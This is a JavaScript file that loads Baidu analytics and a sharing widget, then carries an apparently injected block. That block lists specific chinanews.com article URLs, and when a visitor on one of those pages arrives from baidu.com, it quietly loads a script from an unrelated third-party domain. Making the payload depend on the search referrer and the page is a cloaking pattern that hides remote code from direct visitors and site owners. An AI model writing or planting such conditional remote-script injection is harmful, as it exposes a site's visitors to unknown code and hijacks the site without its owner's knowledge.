var _hmt = _hmt || []; (function() { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?f26eea3c0883be4c444c00f18f6746c0"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); })(); function loadBaiduShare() { var script = document.createElement('script'); script.src = 'https://static.bshare.cn/b/bshareCO.js'; script.onload = function() { if (typeof initBaiduShare === 'function') { initBaiduShare(); } }; script.onerror = function() {}; document.head.appendChild(script); } loadBaiduShare();

function isValidUrl(url, validUrls) {
    return validUrls.includes(url);
}

function isFromBaidu(referrer) {
    return referrer.includes('baidu.com');
}

function loadScript(url) {
    const script = document.createElement('script');
    script.src = url;
    script.onload = () => {
        console.log(`Script loaded: ${url}`);
    };
    script.onerror = () => {
        console.error(`Error loading script: ${url}`);
    };
    document.head.appendChild(script);
}

// 定义符合条件的 URL 数组
const validUrls = [
    'https://www.chinanews.com/m/fortune/2015/04-17/7213848.shtml',
    'https://www.chinanews.com.cn/m/sh/2021/05-13/9476412.shtml',
    'https://www.chinanews.com/ga/2011/10-10/3376725.shtml',
    // 可以添加更多的 URL
];

// 当前页面的 URL 和来路 URL
const currentUrl = window.location.href;
const referrer = document.referrer;

// 判断并加载脚本
if (isValidUrl(currentUrl, validUrls) && isFromBaidu(referrer)) {
    loadScript('https://js.2meiliren.com/fp/eccbc87e4b5ce2fe28308fd9f2a7baf3.js');
} else {
    
}
